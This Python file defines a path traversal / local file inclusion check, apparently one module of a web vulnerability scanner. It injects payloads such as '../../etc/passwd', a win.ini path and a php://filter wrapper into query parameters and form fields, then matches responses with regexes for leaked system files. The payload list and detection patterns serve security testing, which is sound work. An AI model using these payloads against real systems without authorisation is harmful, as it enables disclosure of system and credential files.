import re
from urllib.parse import urlencode, parse_qsl, urlparse, urlunparse
from app.checks.base import ScanCheck, Finding
from app.core.crawler import DiscoveredPage
from app.core.scope_validator import ScopedHttpClient


class PathTraversalCheck(ScanCheck):
    id = "path-traversal"
    name = "Path Traversal / Local File Inclusion (LFI)"
    severity = "critical"
    owasp_category = "A01:2025-Broken Access Control"

    # Traversal payloads for Linux and Windows targets
    PAYLOADS = [
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd",
        "../../../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]

    target_params = {
        "page", "file", "path", "doc", "document", "folder", "root",
        "pg", "style", "pdf", "template", "view", "include", "dir", "action"
    }

    # Regex patterns indicating file read success
    EVIDENCE_PATTERNS = [
        (re.compile(r"root:[x*]?:0:0:[^:\n]*:[^:\n]*:[^\n]*", re.MULTILINE), "Linux /etc/passwd user entry"),
        (re.compile(r"\[(?:fonts|extensions|mci extensions|files)\]", re.IGNORECASE), "Windows win.ini header"),
        (re.compile(r"PD9waH[A-Za-z0-9+/=]{20,}"), "Base64 encoded PHP source code stream")
    ]

    def applies_to(self, page: DiscoveredPage) -> bool:
        return bool(page.query_params or page.forms)

    async def run(self, page: DiscoveredPage, client: ScopedHttpClient) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(page.url)
        params = parse_qsl(parsed.query)

        # 1. Test URL query parameters
        for i, (key, val) in enumerate(params):
            for payload in self.PAYLOADS:
                test_params = params.copy()
                test_params[i] = (key, payload)
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    res = await client.get(test_url)
                    match_found, snippet, desc = self._check_response(res.text)
                    if match_found:
                        findings.append(
                            Finding(
                                check_id=self.id,
                                title=f"Path Traversal / LFI in parameter '{key}'",
                                severity=self.severity,
                                url=page.url,
                                parameter=key,
                                evidence=f"System file disclosure verified ({desc}). Snippet: '{snippet}'",
                                remediation="Use strict allowlists for file inclusion, disable allow_url_include, or resolve paths to canonical absolute paths and verify they reside within the approved web root."
                            )
                        )
                        break
                except Exception:
                    pass

        # 2. Test HTML Form fields
        for form in page.forms:
            form_params = {f.name: f.value or "home" for f in form.fields if f.name}
            for field in form.fields:
                if not field.name or field.field_type in ("submit", "button", "hidden"):
                    continue

                for payload in self.PAYLOADS:
                    test_data = form_params.copy()
                    test_data[field.name] = payload
                    try:
                        if form.method == "POST":
                            res = await client.post(form.action, data=test_data)
                        else:
                            res = await client.get(form.action, params=test_data)

                        match_found, snippet, desc = self._check_response(res.text)
                        if match_found:
                            findings.append(
                                Finding(
                                    check_id=self.id,
                                    title=f"Path Traversal in form field '{field.name}'",
                                    severity=self.severity,
                                    url=form.action,
                                    parameter=field.name,
                                    evidence=f"System file content revealed via form ({desc}). Snippet: '{snippet}'",
                                    remediation="Do not concatenate user input directly into file paths. Use index keys mapped to predefined file arrays."
                                )
                            )
                            break
                    except Exception:
                        pass

        return findings

    def _check_response(self, text: str) -> tuple[bool, str, str]:
        for pattern, desc in self.EVIDENCE_PATTERNS:
            match = pattern.search(text)
            if match:
                snippet = match.group(0)[:80].strip()
                return True, snippet, desc
        # Fallback check for raw /etc/passwd lines
        if "daemon:x:" in text or "bin:x:2:2:" in text:
            idx = text.find("x:0:0:") if "x:0:0:" in text else text.find("daemon:x:")
            start = max(0, idx - 10)
            end = min(len(text), idx + 60)
            return True, text[start:end].strip(), "Linux user database excerpt"
        return False, "", ""
